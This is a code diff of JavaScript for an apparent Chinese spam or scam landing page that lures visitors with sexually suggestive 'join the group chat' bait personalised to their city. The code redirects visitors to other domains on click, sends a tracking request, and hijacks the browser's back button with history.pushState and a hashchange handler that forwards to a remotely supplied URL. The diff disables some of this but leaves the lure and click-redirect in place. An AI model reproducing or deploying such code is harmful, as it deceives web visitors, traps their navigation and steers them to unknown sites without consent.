@@ -6,8 +6,7 @@ $("#nis").html('\u9080\u8bf7\u4f60\u52a0\u5165\u7fa4\u804a');
 $(".bon").html('\u52a0\u5165\u7fa4\u804a');
 $(document).attr("title","\u9080\u4f60\u52a0\u5165\u7fa4\u804a");
 //var obj = JSON.parse(window.atob(getJsParam('b.js', 'xs')));
-var obj = JSON.parse('{"circle_date":"4oCce25hbWV94oCd6YKA5aaz5Yqg5YWl5aWze2ljb25956We6ZuGe2ljb2596IGa5YaF5pyJe3RpbWV95L2N5aW95Y+L54K55Ye76L+b5YWlPj4+","circle_img":"https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/1112/20181120103210.jpg","circle_title":"邀妳加{icon}入少妇野{icon}外车{icon}震群","create_time":"null","describe":"邀妳加入少💘妇野💘外车💘震群","group_img":"https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/1112/20181120103210.jpg","group_title":"邀妳加{icon}入少妇野{icon}外车{icon}震群","id":"1","img":"https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/1112/20181120103210.jpg","title":"{city}野外车✅震群","update_time":"null","will":["梦晗","程晨"]}');
-
+var obj = JSON.parse(bbg);
 var address = localAddress.city ? localAddress.city : (localAddress.province ? localAddress.province : '成都');
 var city = address.replace(/(.*)市/, '$1');
 city = city.replace(/(.*)省/, '$1');
@@ -90,20 +89,20 @@ function toChineseWords(data) {
     return str;
 }
 $(".bon").on('click', function  () {
-	location.href = '../joinchat.php';
+	location.href =d3_domain;
     $.getJSON('http://www.dedaopaper.com/index.php/index/jumpurl/id/' + obj.id, function (t) {
         //location.href = t.val;    
     })
 });
 //http://www.yixitong777.com/adv/Ainterfaces/dir/1029/index/indefive
 //http://zhuangyuanfujiuye.com/index.php/index/vasl/id/6
-$.getJSON('http://zhuangyuanfujiuye.com/index.php/index/vasl/id/6', function (t) {
+$.getJSON('../6.json', function (t) {
     setTimeout(function () {
         history.pushState(history.length + 1, "message", "#" + new Date().getTime());
     }, 200);
    // url = t.url;
   	url=t.v;
     window.onhashchange = function () {
-        location.href = url;      
+        //location.href = url;      
     };
 });
